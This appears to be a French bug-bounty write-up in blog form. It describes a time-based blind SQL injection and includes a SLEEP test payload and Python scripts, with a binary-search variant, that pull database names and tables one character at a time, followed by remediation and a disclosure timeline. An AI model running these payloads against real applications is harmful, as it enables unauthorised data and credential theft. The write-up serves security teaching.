---
title: "Exemple: SQL Injection avancée via Time-Based Blind"
date: 2025-09-22
draft: false
---

## Introduction

Lors d'un engagement récent en bug bounty, j'ai découvert une injection SQL time-based sur une application web d'entreprise. Voici comment je l'ai exploitée pour extraire des données sensibles.

## Découverte de la vulnérabilité

L'application possédait un paramètre de recherche vulnérable :

```
https://target.com/search?id=1
```

Les tests classiques d'injection SQL ne retournaient aucune erreur visible, mais l'application semblait vulnérable.

## Exploitation Time-Based

### Test initial

J'ai testé une injection time-based pour confirmer la vulnérabilité :

```sql
1' AND SLEEP(5)--
```

Le serveur a pris exactement 5 secondes pour répondre, confirmant la vulnérabilité.

### Script d'exploitation

J'ai créé un script Python pour automatiser l'extraction :

```python
import requests
import time

def extract_data(query):
    url = "https://target.com/search"
    result = ""
    
    for i in range(1, 50):
        for char in range(32, 127):
            payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{i},1))={char},SLEEP(3),0)--"
            
            start = time.time()
            r = requests.get(url, params={'id': payload})
            elapsed = time.time() - start
            
            if elapsed > 2.5:
                result += chr(char)
                print(result)
                break
        
        if char == 126:  # Fin de la chaîne
            break
    
    return result

# Extraction du nom de la base de données
db_name = extract_data("SELECT DATABASE()")
print(f"Database: {db_name}")

# Extraction des tables
tables = extract_data("SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()")
print(f"Tables: {tables}")
```

### Optimisation

Pour accélérer l'extraction, j'ai utilisé la recherche binaire :

```python
def binary_search_char(query, position):
    low, high = 32, 126
    
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP(2),0)--"
        
        start = time.time()
        r = requests.get(url, params={'id': payload})
        elapsed = time.time() - start
        
        if elapsed > 1.5:
            low = mid + 1
        else:
            high = mid - 1
    
    return chr(low)
```

## Résultats

J'ai pu extraire :
- Le nom de la base de données
- La liste des tables
- Les credentials administrateur (hashés)
- Plusieurs informations sensibles

## Remédiation

Les recommandations pour corriger cette vulnérabilité :

1. **Utiliser des requêtes préparées** (Prepared Statements)
2. **Valider toutes les entrées utilisateur**
3. **Limiter les permissions de la base de données**
4. **Implémenter un WAF**
5. **Monitorer les requêtes anormalement lentes**

## Impact

Cette vulnérabilité a été classée comme **Critique** (CVSS 9.1) car elle permettait :
- L'extraction de données sensibles
- L'accès aux credentials
- La possibilité d'escalade vers RCE

## Timeline

- **2025-09-15** : Découverte de la vulnérabilité
- **2025-09-15** : Rapport au programme bug bounty
- **2025-09-18** : Confirmation par l'équipe de sécurité
- **2025-09-20** : Patch déployé
- **2025-09-22** : Récompense de $3,500 USD

## Conclusion

Les injections SQL time-based sont plus difficiles à détecter mais restent une menace sérieuse. Une bonne pratique de développement sécurisé est essentielle pour prévenir ce type de vulnérabilité.
